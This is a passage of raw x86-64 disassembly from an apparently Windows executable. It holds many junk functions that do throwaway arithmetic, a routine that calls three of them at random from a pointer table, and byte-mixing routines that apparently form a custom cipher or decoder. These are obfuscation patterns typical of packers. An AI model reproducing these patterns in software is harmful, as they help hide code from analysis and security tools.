   1400038a1:	5e                   	pop    %rsi
   1400038a2:	5b                   	pop    %rbx
   1400038a3:	c3                   	ret
   1400038a4:	53                   	push   %rbx
   1400038a5:	56                   	push   %rsi
   1400038a6:	57                   	push   %rdi
   1400038a7:	41 54                	push   %r12
   1400038a9:	41 55                	push   %r13
   1400038ab:	48 83 ec 20          	sub    $0x20,%rsp
   1400038af:	e8 a6 d7 ff ff       	call   0x14000105a
   1400038b4:	25 ff 00 00 00       	and    $0xff,%eax
   1400038b9:	b8 01 00 00 00       	mov    $0x1,%eax
   1400038be:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400038c3:	0f af c1             	imul   %ecx,%eax
   1400038c6:	ff c9                	dec    %ecx
   1400038c8:	75 f9                	jne    0x1400038c3
   1400038ca:	48 83 c4 20          	add    $0x20,%rsp
   1400038ce:	41 5d                	pop    %r13
   1400038d0:	41 5c                	pop    %r12
   1400038d2:	5f                   	pop    %rdi
   1400038d3:	5e                   	pop    %rsi
   1400038d4:	5b                   	pop    %rbx
   1400038d5:	c3                   	ret
   1400038d6:	53                   	push   %rbx
   1400038d7:	56                   	push   %rsi
   1400038d8:	57                   	push   %rdi
   1400038d9:	41 54                	push   %r12
   1400038db:	41 55                	push   %r13
   1400038dd:	48 83 ec 20          	sub    $0x20,%rsp
   1400038e1:	6a 2d                	push   $0x2d
   1400038e3:	58                   	pop    %rax
   1400038e4:	48 d1 e0             	shl    $1,%rax
   1400038e7:	48 83 c4 20          	add    $0x20,%rsp
   1400038eb:	41 5d                	pop    %r13
   1400038ed:	41 5c                	pop    %r12
   1400038ef:	5f                   	pop    %rdi
   1400038f0:	5e                   	pop    %rsi
   1400038f1:	5b                   	pop    %rbx
   1400038f2:	c3                   	ret
   1400038f3:	53                   	push   %rbx
   1400038f4:	56                   	push   %rsi
   1400038f5:	57                   	push   %rdi
   1400038f6:	41 54                	push   %r12
   1400038f8:	41 55                	push   %r13
   1400038fa:	48 83 ec 20          	sub    $0x20,%rsp
   1400038fe:	b8 34 00 00 00       	mov    $0x34,%eax
   140003903:	bb 07 00 00 00       	mov    $0x7,%ebx
   140003908:	21 d8                	and    %ebx,%eax
   14000390a:	83 cb 0d             	or     $0xd,%ebx
   14000390d:	48 83 c4 20          	add    $0x20,%rsp
   140003911:	41 5d                	pop    %r13
   140003913:	41 5c                	pop    %r12
   140003915:	5f                   	pop    %rdi
   140003916:	5e                   	pop    %rsi
   140003917:	5b                   	pop    %rbx
   140003918:	c3                   	ret
   140003919:	53                   	push   %rbx
   14000391a:	56                   	push   %rsi
   14000391b:	57                   	push   %rdi
   14000391c:	41 54                	push   %r12
   14000391e:	41 55                	push   %r13
   140003920:	48 83 ec 20          	sub    $0x20,%rsp
   140003924:	e8 31 d7 ff ff       	call   0x14000105a
   140003929:	25 ff 00 00 00       	and    $0xff,%eax
   14000392e:	b8 01 00 00 00       	mov    $0x1,%eax
   140003933:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003938:	6b c0 02             	imul   $0x2,%eax,%eax
   14000393b:	ff c9                	dec    %ecx
   14000393d:	75 f9                	jne    0x140003938
   14000393f:	48 83 c4 20          	add    $0x20,%rsp
   140003943:	41 5d                	pop    %r13
   140003945:	41 5c                	pop    %r12
   140003947:	5f                   	pop    %rdi
   140003948:	5e                   	pop    %rsi
   140003949:	5b                   	pop    %rbx
   14000394a:	c3                   	ret
   14000394b:	53                   	push   %rbx
   14000394c:	56                   	push   %rsi
   14000394d:	57                   	push   %rdi
   14000394e:	41 54                	push   %r12
   140003950:	41 55                	push   %r13
   140003952:	48 83 ec 20          	sub    $0x20,%rsp
   140003956:	b8 1c 00 00 00       	mov    $0x1c,%eax
   14000395b:	bb 36 00 00 00       	mov    $0x36,%ebx
   140003960:	b9 4f 00 00 00       	mov    $0x4f,%ecx
   140003965:	01 d8                	add    %ebx,%eax
   140003967:	01 c8                	add    %ecx,%eax
   140003969:	48 83 c4 20          	add    $0x20,%rsp
   14000396d:	41 5d                	pop    %r13
   14000396f:	41 5c                	pop    %r12
   140003971:	5f                   	pop    %rdi
   140003972:	5e                   	pop    %rsi
   140003973:	5b                   	pop    %rbx
   140003974:	c3                   	ret
   140003975:	53                   	push   %rbx
   140003976:	56                   	push   %rsi
   140003977:	57                   	push   %rdi
   140003978:	41 54                	push   %r12
   14000397a:	41 55                	push   %r13
   14000397c:	48 83 ec 20          	sub    $0x20,%rsp
   140003980:	b8 1c 00 00 00       	mov    $0x1c,%eax
   140003985:	6b c0 02             	imul   $0x2,%eax,%eax
   140003988:	83 c0 2c             	add    $0x2c,%eax
   14000398b:	6b c0 03             	imul   $0x3,%eax,%eax
   14000398e:	48 83 c4 20          	add    $0x20,%rsp
   140003992:	41 5d                	pop    %r13
   140003994:	41 5c                	pop    %r12
   140003996:	5f                   	pop    %rdi
   140003997:	5e                   	pop    %rsi
   140003998:	5b                   	pop    %rbx
   140003999:	c3                   	ret
   14000399a:	53                   	push   %rbx
   14000399b:	56                   	push   %rsi
   14000399c:	57                   	push   %rdi
   14000399d:	41 54                	push   %r12
   14000399f:	41 55                	push   %r13
   1400039a1:	48 83 ec 20          	sub    $0x20,%rsp
   1400039a5:	48 c7 c0 02 00 00 00 	mov    $0x2,%rax
   1400039ac:	48 8d 58 01          	lea    0x1(%rax),%rbx
   1400039b0:	48 01 d8             	add    %rbx,%rax
   1400039b3:	48 83 c4 20          	add    $0x20,%rsp
   1400039b7:	41 5d                	pop    %r13
   1400039b9:	41 5c                	pop    %r12
   1400039bb:	5f                   	pop    %rdi
   1400039bc:	5e                   	pop    %rsi
   1400039bd:	5b                   	pop    %rbx
   1400039be:	c3                   	ret
   1400039bf:	53                   	push   %rbx
   1400039c0:	56                   	push   %rsi
   1400039c1:	57                   	push   %rdi
   1400039c2:	41 54                	push   %r12
   1400039c4:	41 55                	push   %r13
   1400039c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400039ca:	e8 8b d6 ff ff       	call   0x14000105a
   1400039cf:	25 ff 00 00 00       	and    $0xff,%eax
   1400039d4:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400039d9:	31 c0                	xor    %eax,%eax
   1400039db:	83 c0 02             	add    $0x2,%eax
   1400039de:	ff c9                	dec    %ecx
   1400039e0:	75 f9                	jne    0x1400039db
   1400039e2:	48 83 c4 20          	add    $0x20,%rsp
   1400039e6:	41 5d                	pop    %r13
   1400039e8:	41 5c                	pop    %r12
   1400039ea:	5f                   	pop    %rdi
   1400039eb:	5e                   	pop    %rsi
   1400039ec:	5b                   	pop    %rbx
   1400039ed:	c3                   	ret
   1400039ee:	53                   	push   %rbx
   1400039ef:	56                   	push   %rsi
   1400039f0:	57                   	push   %rdi
   1400039f1:	41 54                	push   %r12
   1400039f3:	41 55                	push   %r13
   1400039f5:	48 83 ec 20          	sub    $0x20,%rsp
   1400039f9:	b8 0d 00 00 00       	mov    $0xd,%eax
   1400039fe:	83 e0 01             	and    $0x1,%eax
   140003a01:	74 07                	je     0x140003a0a
   140003a03:	b8 45 00 00 00       	mov    $0x45,%eax
   140003a08:	eb 05                	jmp    0x140003a0f
   140003a0a:	b8 14 00 00 00       	mov    $0x14,%eax
   140003a0f:	48 83 c4 20          	add    $0x20,%rsp
   140003a13:	41 5d                	pop    %r13
   140003a15:	41 5c                	pop    %r12
   140003a17:	5f                   	pop    %rdi
   140003a18:	5e                   	pop    %rsi
   140003a19:	5b                   	pop    %rbx
   140003a1a:	c3                   	ret
   140003a1b:	53                   	push   %rbx
   140003a1c:	56                   	push   %rsi
   140003a1d:	57                   	push   %rdi
   140003a1e:	41 54                	push   %r12
   140003a20:	41 55                	push   %r13
   140003a22:	48 83 ec 20          	sub    $0x20,%rsp
   140003a26:	e8 2f d6 ff ff       	call   0x14000105a
   140003a2b:	25 ff 00 00 00       	and    $0xff,%eax
   140003a30:	b8 ad 00 00 00       	mov    $0xad,%eax
   140003a35:	bb 0b 00 00 00       	mov    $0xb,%ebx
   140003a3a:	01 d8                	add    %ebx,%eax
   140003a3c:	d1 e0                	shl    $1,%eax
   140003a3e:	48 83 c4 20          	add    $0x20,%rsp
   140003a42:	41 5d                	pop    %r13
   140003a44:	41 5c                	pop    %r12
   140003a46:	5f                   	pop    %rdi
   140003a47:	5e                   	pop    %rsi
   140003a48:	5b                   	pop    %rbx
   140003a49:	c3                   	ret
   140003a4a:	53                   	push   %rbx
   140003a4b:	56                   	push   %rsi
   140003a4c:	57                   	push   %rdi
   140003a4d:	41 54                	push   %r12
   140003a4f:	41 55                	push   %r13
   140003a51:	48 83 ec 20          	sub    $0x20,%rsp
   140003a55:	e8 00 d6 ff ff       	call   0x14000105a
   140003a5a:	25 ff 00 00 00       	and    $0xff,%eax
   140003a5f:	b8 13 00 00 00       	mov    $0x13,%eax
   140003a64:	bb 19 00 00 00       	mov    $0x19,%ebx
   140003a69:	83 f8 1e             	cmp    $0x1e,%eax
   140003a6c:	7c 09                	jl     0x140003a77
   140003a6e:	83 fb 46             	cmp    $0x46,%ebx
   140003a71:	7f 09                	jg     0x140003a7c
   140003a73:	01 d8                	add    %ebx,%eax
   140003a75:	eb 08                	jmp    0x140003a7f
   140003a77:	83 e8 05             	sub    $0x5,%eax
   140003a7a:	eb 03                	jmp    0x140003a7f
   140003a7c:	83 c3 0a             	add    $0xa,%ebx
   140003a7f:	48 83 c4 20          	add    $0x20,%rsp
   140003a83:	41 5d                	pop    %r13
   140003a85:	41 5c                	pop    %r12
   140003a87:	5f                   	pop    %rdi
   140003a88:	5e                   	pop    %rsi
   140003a89:	5b                   	pop    %rbx
   140003a8a:	c3                   	ret
   140003a8b:	53                   	push   %rbx
   140003a8c:	56                   	push   %rsi
   140003a8d:	57                   	push   %rdi
   140003a8e:	41 54                	push   %r12
   140003a90:	41 55                	push   %r13
   140003a92:	48 83 ec 20          	sub    $0x20,%rsp
   140003a96:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003a9b:	31 c0                	xor    %eax,%eax
   140003a9d:	83 c0 01             	add    $0x1,%eax
   140003aa0:	ff c9                	dec    %ecx
   140003aa2:	75 f9                	jne    0x140003a9d
   140003aa4:	48 83 c4 20          	add    $0x20,%rsp
   140003aa8:	41 5d                	pop    %r13
   140003aaa:	41 5c                	pop    %r12
   140003aac:	5f                   	pop    %rdi
   140003aad:	5e                   	pop    %rsi
   140003aae:	5b                   	pop    %rbx
   140003aaf:	c3                   	ret
   140003ab0:	53                   	push   %rbx
   140003ab1:	56                   	push   %rsi
   140003ab2:	57                   	push   %rdi
   140003ab3:	41 54                	push   %r12
   140003ab5:	41 55                	push   %r13
   140003ab7:	48 83 ec 20          	sub    $0x20,%rsp
   140003abb:	e8 9a d5 ff ff       	call   0x14000105a
   140003ac0:	25 ff 00 00 00       	and    $0xff,%eax
   140003ac5:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003aca:	31 c0                	xor    %eax,%eax
   140003acc:	83 c0 02             	add    $0x2,%eax
   140003acf:	ff c9                	dec    %ecx
   140003ad1:	75 f9                	jne    0x140003acc
   140003ad3:	48 83 c4 20          	add    $0x20,%rsp
   140003ad7:	41 5d                	pop    %r13
   140003ad9:	41 5c                	pop    %r12
   140003adb:	5f                   	pop    %rdi
   140003adc:	5e                   	pop    %rsi
   140003add:	5b                   	pop    %rbx
   140003ade:	c3                   	ret
   140003adf:	53                   	push   %rbx
   140003ae0:	56                   	push   %rsi
   140003ae1:	57                   	push   %rdi
   140003ae2:	41 54                	push   %r12
   140003ae4:	41 55                	push   %r13
   140003ae6:	48 83 ec 20          	sub    $0x20,%rsp
   140003aea:	e8 6b d5 ff ff       	call   0x14000105a
   140003aef:	25 ff 00 00 00       	and    $0xff,%eax
   140003af4:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003af9:	31 c0                	xor    %eax,%eax
   140003afb:	83 c0 02             	add    $0x2,%eax
   140003afe:	ff c9                	dec    %ecx
   140003b00:	75 f9                	jne    0x140003afb
   140003b02:	48 83 c4 20          	add    $0x20,%rsp
   140003b06:	41 5d                	pop    %r13
   140003b08:	41 5c                	pop    %r12
   140003b0a:	5f                   	pop    %rdi
   140003b0b:	5e                   	pop    %rsi
   140003b0c:	5b                   	pop    %rbx
   140003b0d:	c3                   	ret
   140003b0e:	53                   	push   %rbx
   140003b0f:	56                   	push   %rsi
   140003b10:	57                   	push   %rdi
   140003b11:	41 54                	push   %r12
   140003b13:	41 55                	push   %r13
   140003b15:	48 83 ec 20          	sub    $0x20,%rsp
   140003b19:	b8 5c 00 00 00       	mov    $0x5c,%eax
   140003b1e:	83 c0 1b             	add    $0x1b,%eax
   140003b21:	71 07                	jno    0x140003b2a
   140003b23:	b8 00 00 00 00       	mov    $0x0,%eax
   140003b28:	eb 03                	jmp    0x140003b2d
   140003b2a:	83 e8 02             	sub    $0x2,%eax
   140003b2d:	48 83 c4 20          	add    $0x20,%rsp
   140003b31:	41 5d                	pop    %r13
   140003b33:	41 5c                	pop    %r12
   140003b35:	5f                   	pop    %rdi
   140003b36:	5e                   	pop    %rsi
   140003b37:	5b                   	pop    %rbx
   140003b38:	c3                   	ret
   140003b39:	53                   	push   %rbx
   140003b3a:	56                   	push   %rsi
   140003b3b:	57                   	push   %rdi
   140003b3c:	41 54                	push   %r12
   140003b3e:	41 55                	push   %r13
   140003b40:	48 83 ec 20          	sub    $0x20,%rsp
   140003b44:	b8 c5 00 00 00       	mov    $0xc5,%eax
   140003b49:	d1 e8                	shr    $1,%eax
   140003b4b:	72 05                	jb     0x140003b52
   140003b4d:	c1 e0 02             	shl    $0x2,%eax
   140003b50:	eb 02                	jmp    0x140003b54
   140003b52:	d1 e0                	shl    $1,%eax
   140003b54:	48 83 c4 20          	add    $0x20,%rsp
   140003b58:	41 5d                	pop    %r13
   140003b5a:	41 5c                	pop    %r12
   140003b5c:	5f                   	pop    %rdi
   140003b5d:	5e                   	pop    %rsi
   140003b5e:	5b                   	pop    %rbx
   140003b5f:	c3                   	ret
   140003b60:	53                   	push   %rbx
   140003b61:	56                   	push   %rsi
   140003b62:	57                   	push   %rdi
   140003b63:	41 54                	push   %r12
   140003b65:	41 55                	push   %r13
   140003b67:	48 83 ec 28          	sub    $0x28,%rsp
   140003b6b:	83 3d b6 a2 0a 00 00 	cmpl   $0x0,0xaa2b6(%rip)        # 0x1400ade28
   140003b72:	75 05                	jne    0x140003b79
   140003b74:	e8 87 d4 ff ff       	call   0x140001000
   140003b79:	49 c7 c4 03 00 00 00 	mov    $0x3,%r12
   140003b80:	e8 d5 d4 ff ff       	call   0x14000105a
   140003b85:	48 31 d2             	xor    %rdx,%rdx
   140003b88:	48 c7 c1 05 01 00 00 	mov    $0x105,%rcx
   140003b8f:	48 f7 f1             	div    %rcx
   140003b92:	48 8d 1d 67 9a 0a 00 	lea    0xa9a67(%rip),%rbx        # 0x1400ad600
   140003b99:	48 8b 04 d3          	mov    (%rbx,%rdx,8),%rax
   140003b9d:	ff d0                	call   *%rax
   140003b9f:	49 ff cc             	dec    %r12
   140003ba2:	75 dc                	jne    0x140003b80
   140003ba4:	48 83 c4 28          	add    $0x28,%rsp
   140003ba8:	41 5d                	pop    %r13
   140003baa:	41 5c                	pop    %r12
   140003bac:	5f                   	pop    %rdi
   140003bad:	5e                   	pop    %rsi
   140003bae:	5b                   	pop    %rbx
   140003baf:	c3                   	ret
   140003bb0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003bb5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003bba:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003bbf:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003bc4:	41 54                	push   %r12
   140003bc6:	41 56                	push   %r14
   140003bc8:	41 57                	push   %r15
   140003bca:	8b 5c 24 58          	mov    0x58(%rsp),%ebx
   140003bce:	8b c2                	mov    %edx,%eax
   140003bd0:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140003bd5:	44 8b d2             	mov    %edx,%r10d
   140003bd8:	99                   	cltd
   140003bd9:	49 8b f1             	mov    %r9,%rsi
   140003bdc:	f7 fb                	idiv   %ebx
   140003bde:	4d 8b f0             	mov    %r8,%r14
   140003be1:	0f b6 e9             	movzbl %cl,%ebp
   140003be4:	48 63 c2             	movslq %edx,%rax
   140003be7:	44 0f b6 1c 38       	movzbl (%rax,%rdi,1),%r11d
   140003bec:	41 8b c2             	mov    %r10d,%eax
   140003bef:	25 1f 00 00 80       	and    $0x8000001f,%eax
   140003bf4:	7d 07                	jge    0x140003bfd
   140003bf6:	ff c8                	dec    %eax
   140003bf8:	83 c8 e0             	or     $0xffffffe0,%eax
   140003bfb:	ff c0                	inc    %eax
   140003bfd:	48 98                	cltq
   140003bff:	4c 8d 3d fa c3 ff ff 	lea    -0x3c06(%rip),%r15        # 0x140000000
   140003c06:	46 0f b6 a4 38 20 70 	movzbl 0x7020(%rax,%r15,1),%r12d
   140003c0d:	00 00 
   140003c0f:	46 0f b6 bc 38 00 70 	movzbl 0x7000(%rax,%r15,1),%r15d
   140003c16:	00 00 
   140003c18:	41 8d 42 07          	lea    0x7(%r10),%eax
   140003c1c:	99                   	cltd
   140003c1d:	f7 fb                	idiv   %ebx
   140003c1f:	41 8d 42 06          	lea    0x6(%r10),%eax
   140003c23:	48 63 ca             	movslq %edx,%rcx
   140003c26:	99                   	cltd
   140003c27:	f7 fb                	idiv   %ebx
   140003c29:	48 63 c2             	movslq %edx,%rax
   140003c2c:	0f b6 14 39          	movzbl (%rcx,%rdi,1),%edx
   140003c30:	32 14 38             	xor    (%rax,%rdi,1),%dl
   140003c33:	41 8d 42 02          	lea    0x2(%r10),%eax
   140003c37:	25 ff 00 00 80       	and    $0x800000ff,%eax
   140003c3c:	7d 09                	jge    0x140003c47
   140003c3e:	ff c8                	dec    %eax
   140003c40:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   140003c45:	ff c0                	inc    %eax
   140003c47:	48 98                	cltq
   140003c49:	42 32 14 08          	xor    (%rax,%r9,1),%dl
   140003c4d:	41 8b c2             	mov    %r10d,%eax
   140003c50:	25 ff 00 00 80       	and    $0x800000ff,%eax
   140003c55:	7d 09                	jge    0x140003c60
   140003c57:	ff c8                	dec    %eax
   140003c59:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   140003c5e:	ff c0                	inc    %eax
   140003c60:	4c 8b 4c 24 48       	mov    0x48(%rsp),%r9
   140003c65:	48 98                	cltq
   140003c67:	42 32 14 08          	xor    (%rax,%r9,1),%dl
   140003c6b:	41 8b c2             	mov    %r10d,%eax
   140003c6e:	25 7f 00 00 80       	and    $0x8000007f,%eax
   140003c73:	7d 07                	jge    0x140003c7c
   140003c75:	ff c8                	dec    %eax
   140003c77:	83 c8 80             	or     $0xffffff80,%eax
   140003c7a:	ff c0                	inc    %eax
   140003c7c:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003c81:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003c86:	48 98                	cltq
   140003c88:	32 14 18             	xor    (%rax,%rbx,1),%dl
   140003c8b:	40 0f b6 c5          	movzbl %bpl,%eax
   140003c8f:	41 32 d7             	xor    %r15b,%dl
   140003c92:	41 32 d4             	xor    %r12b,%dl
   140003c95:	41 32 d3             	xor    %r11b,%dl
   140003c98:	0f b6 fa             	movzbl %dl,%edi
   140003c9b:	41 0f b6 d3          	movzbl %r11b,%edx
   140003c9f:	80 e2 07             	and    $0x7,%dl
   140003ca2:	fe c2                	inc    %dl
   140003ca4:	2a ca                	sub    %dl,%cl
   140003ca6:	d2 e8                	shr    %cl,%al
   140003ca8:	0f b6 ca             	movzbl %dl,%ecx
   140003cab:	40 d2 e5             	shl    %cl,%bpl
   140003cae:	40 0a c5             	or     %bpl,%al
   140003cb1:	44 0f b6 c0          	movzbl %al,%r8d
   140003cb5:	41 0f b6 c8          	movzbl %r8b,%ecx
   140003cb9:	41 8b d0             	mov    %r8d,%edx
   140003cbc:	c0 c9 06             	ror    $0x6,%cl
   140003cbf:	43 8d 04 10          	lea    (%r8,%r10,1),%eax
   140003cc3:	25 ff 00 00 80       	and    $0x800000ff,%eax
   140003cc8:	7d 09                	jge    0x140003cd3
   140003cca:	ff c8                	dec    %eax
   140003ccc:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   140003cd1:	ff c0                	inc    %eax
   140003cd3:	48 98                	cltq
   140003cd5:	83 e2 7f             	and    $0x7f,%edx
   140003cd8:	32 0c 30             	xor    (%rax,%rsi,1),%cl
   140003cdb:	32 0c 1a             	xor    (%rdx,%rbx,1),%cl
   140003cde:	41 32 c8             	xor    %r8b,%cl
   140003ce1:	0f b6 d1             	movzbl %cl,%edx
   140003ce4:	41 8d 04 12          	lea    (%r10,%rdx,1),%eax
   140003ce8:	25 ff 03 00 80       	and    $0x800003ff,%eax
   140003ced:	7d 09                	jge    0x140003cf8
   140003cef:	ff c8                	dec    %eax
   140003cf1:	0d 00 fc ff ff       	or     $0xfffffc00,%eax
   140003cf6:	ff c0                	inc    %eax
   140003cf8:	48 98                	cltq
   140003cfa:	41 80 e3 9f          	and    $0x9f,%r11b
   140003cfe:	41 80 cb 03          	or     $0x3,%r11b
   140003d02:	42 02 14 30          	add    (%rax,%r14,1),%dl
   140003d06:	41 02 d7             	add    %r15b,%dl
   140003d09:	41 0f b6 c3          	movzbl %r11b,%eax
   140003d0d:	0f b6 ca             	movzbl %dl,%ecx
   140003d10:	0f af c8             	imul   %eax,%ecx
   140003d13:	0f b6 d1             	movzbl %cl,%edx
   140003d16:	41 8d 04 12          	lea    (%r10,%rdx,1),%eax
   140003d1a:	25 ff 00 00 80       	and    $0x800000ff,%eax
   140003d1f:	7d 09                	jge    0x140003d2a
   140003d21:	ff c8                	dec    %eax
   140003d23:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   140003d28:	ff c0                	inc    %eax
   140003d2a:	48 98                	cltq
   140003d2c:	42 32 14 08          	xor    (%rax,%r9,1),%dl
   140003d30:	40 0f b6 c7          	movzbl %dil,%eax
   140003d34:	02 c0                	add    %al,%al
   140003d36:	8d 0c 38             	lea    (%rax,%rdi,1),%ecx
   140003d39:	41 0f b6 c4          	movzbl %r12b,%eax
   140003d3d:	02 d1                	add    %cl,%dl
   140003d3f:	41 c0 e4 02          	shl    $0x2,%r12b
   140003d43:	41 02 c4             	add    %r12b,%al
   140003d46:	02 d0                	add    %al,%dl
   140003d48:	44 0f b6 c2          	movzbl %dl,%r8d
   140003d4c:	41 03 f8             	add    %r8d,%edi
   140003d4f:	41 0f b6 d0          	movzbl %r8b,%edx
   140003d53:	c0 ca 05             	ror    $0x5,%dl
   140003d56:	42 32 14 37          	xor    (%rdi,%r14,1),%dl
   140003d5a:	41 32 14 30          	xor    (%r8,%rsi,1),%dl
   140003d5e:	41 32 d0             	xor    %r8b,%dl
   140003d61:	44 0f b6 c2          	movzbl %dl,%r8d
   140003d65:	43 8d 04 10          	lea    (%r8,%r10,1),%eax
   140003d69:	8b c8                	mov    %eax,%ecx
   140003d6b:	81 e1 ff 00 00 80    	and    $0x800000ff,%ecx
   140003d71:	7d 0a                	jge    0x140003d7d
   140003d73:	ff c9                	dec    %ecx
   140003d75:	81 c9 00 ff ff ff    	or     $0xffffff00,%ecx
   140003d7b:	ff c1                	inc    %ecx
   140003d7d:	48 63 d1             	movslq %ecx,%rdx
   140003d80:	25 7f 00 00 80       	and    $0x8000007f,%eax
   140003d85:	7d 07                	jge    0x140003d8e
   140003d87:	ff c8                	dec    %eax
   140003d89:	83 c8 80             	or     $0xffffff80,%eax
   140003d8c:	ff c0                	inc    %eax
   140003d8e:	48 8b 6c 24 28       	mov    0x28(%rsp),%rbp
   140003d93:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140003d98:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   140003d9d:	48 98                	cltq
   140003d9f:	0f b6 04 18          	movzbl (%rax,%rbx,1),%eax
   140003da3:	42 2a 04 0a          	sub    (%rdx,%r9,1),%al
   140003da7:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140003dac:	41 02 c0             	add    %r8b,%al
   140003daf:	41 5f                	pop    %r15
   140003db1:	41 5e                	pop    %r14
   140003db3:	41 5c                	pop    %r12
   140003db5:	c3                   	ret
   140003db6:	cc                   	int3
   140003db7:	cc                   	int3
   140003db8:	cc                   	int3
   140003db9:	cc                   	int3
   140003dba:	cc                   	int3
   140003dbb:	cc                   	int3
   140003dbc:	cc                   	int3
   140003dbd:	cc                   	int3
   140003dbe:	cc                   	int3
   140003dbf:	cc                   	int3
   140003dc0:	48 85 c9             	test   %rcx,%rcx
   140003dc3:	0f 84 45 0d 00 00    	je     0x140004b0e
   140003dc9:	48 8b c4             	mov    %rsp,%rax
   140003dcc:	4c 89 48 20          	mov    %r9,0x20(%rax)
   140003dd0:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140003dd4:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140003dd8:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140003ddc:	56                   	push   %rsi
   140003ddd:	41 57                	push   %r15
   140003ddf:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   140003de6:	4d 8b f9             	mov    %r9,%r15
   140003de9:	48 8b f1             	mov    %rcx,%rsi
   140003dec:	48 85 d2             	test   %rdx,%rdx
   140003def:	0f 84 0f 0d 00 00    	je     0x140004b04
   140003df5:	4d 85 c0             	test   %r8,%r8
   140003df8:	0f 84 06 0d 00 00    	je     0x140004b04
   140003dfe:	4d 85 c9             	test   %r9,%r9
   140003e01:	0f 84 fd 0c 00 00    	je     0x140004b04
   140003e07:	48 89 68 e0          	mov    %rbp,-0x20(%rax)
   140003e0b:	48 8b ac 24 d0 00 00 	mov    0xd0(%rsp),%rbp
   140003e12:	00 
   140003e13:	48 85 ed             	test   %rbp,%rbp
   140003e16:	0f 84 e0 0c 00 00    	je     0x140004afc
   140003e1c:	4c 89 68 c8          	mov    %r13,-0x38(%rax)
   140003e20:	4c 8b ac 24 d8 00 00 	mov    0xd8(%rsp),%r13
   140003e27:	00 
   140003e28:	4d 85 ed             	test   %r13,%r13
   140003e2b:	0f 84 c6 0c 00 00    	je     0x140004af7
   140003e31:	48 89 58 e8          	mov    %rbx,-0x18(%rax)
   140003e35:	4c 8d 1d c4 c1 ff ff 	lea    -0x3e3c(%rip),%r11        # 0x140000000
   140003e3c:	48 89 78 d8          	mov    %rdi,-0x28(%rax)
   140003e40:	4d 8b d7             	mov    %r15,%r10
   140003e43:	4c 89 60 d0          	mov    %r12,-0x30(%rax)
   140003e47:	4c 89 70 c0          	mov    %r14,-0x40(%rax)
   140003e4b:	48 b8 ab aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaab,%rax
   140003e52:	aa aa aa 
   140003e55:	49 f7 e5             	mul    %r13
   140003e58:	48 8b c2             	mov    %rdx,%rax
   140003e5b:	33 d2                	xor    %edx,%edx
   140003e5d:	48 d1 e8             	shr    $1,%rax
   140003e60:	49 f7 f5             	div    %r13
   140003e63:	49 8b c5             	mov    %r13,%rax
   140003e66:	48 d1 e8             	shr    $1,%rax
   140003e69:	44 0f b6 24 2a       	movzbl (%rdx,%rbp,1),%r12d
   140003e6e:	33 d2                	xor    %edx,%edx
   140003e70:	49 f7 f5             	div    %r13
   140003e73:	44 32 24 2a          	xor    (%rdx,%rbp,1),%r12b
   140003e77:	45 32 64 2d ff       	xor    -0x1(%r13,%rbp,1),%r12b
   140003e7c:	44 32 65 00          	xor    0x0(%rbp),%r12b
   140003e80:	44 88 64 24 01       	mov    %r12b,0x1(%rsp)
   140003e85:	41 80 f4 71          	xor    $0x71,%r12b
   140003e89:	45 33 f6             	xor    %r14d,%r14d
   140003e8c:	44 88 24 24          	mov    %r12b,(%rsp)
   140003e90:	44 89 74 24 24       	mov    %r14d,0x24(%rsp)
   140003e95:	45 8b ce             	mov    %r14d,%r9d
   140003e98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003e9f:	00 
   140003ea0:	41 8b c1             	mov    %r9d,%eax
   140003ea3:	41 8b c9             	mov    %r9d,%ecx
   140003ea6:	99                   	cltd
   140003ea7:	83 e1 1f             	and    $0x1f,%ecx
   140003eaa:	41 f7 fd             	idiv   %r13d
   140003ead:	48 63 c2             	movslq %edx,%rax
   140003eb0:	44 0f b6 04 28       	movzbl (%rax,%rbp,1),%r8d
   140003eb5:	46 32 84 19 20 70 00 	xor    0x7020(%rcx,%r11,1),%r8b
   140003ebc:	00 
   140003ebd:	46 32 84 19 00 70 00 	xor    0x7000(%rcx,%r11,1),%r8b
   140003ec4:	00 
   140003ec5:	41 8d 49 02          	lea    0x2(%r9),%ecx
   140003ec9:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140003ecc:	45 32 c1             	xor    %r9b,%r8b
   140003ecf:	99                   	cltd
   140003ed0:	45 88 02             	mov    %r8b,(%r10)
   140003ed3:	41 f7 fd             	idiv   %r13d
   140003ed6:	48 63 c2             	movslq %edx,%rax
   140003ed9:	0f b6 14 28          	movzbl (%rax,%rbp,1),%edx
   140003edd:	c0 e2 03             	shl    $0x3,%dl
   140003ee0:	41 02 d0             	add    %r8b,%dl
   140003ee3:	81 e1 1f 00 00 80    	and    $0x8000001f,%ecx
   140003ee9:	7d 07                	jge    0x140003ef2
   140003eeb:	ff c9                	dec    %ecx
   140003eed:	83 c9 e0             	or     $0xffffffe0,%ecx
   140003ef0:	ff c1                	inc    %ecx
   140003ef2:	48 63 c1             	movslq %ecx,%rax
   140003ef5:	41 ff c1             	inc    %r9d
   140003ef8:	42 0f b6 8c 18 00 70 	movzbl 0x7000(%rax,%r11,1),%ecx
   140003eff:	00 00 
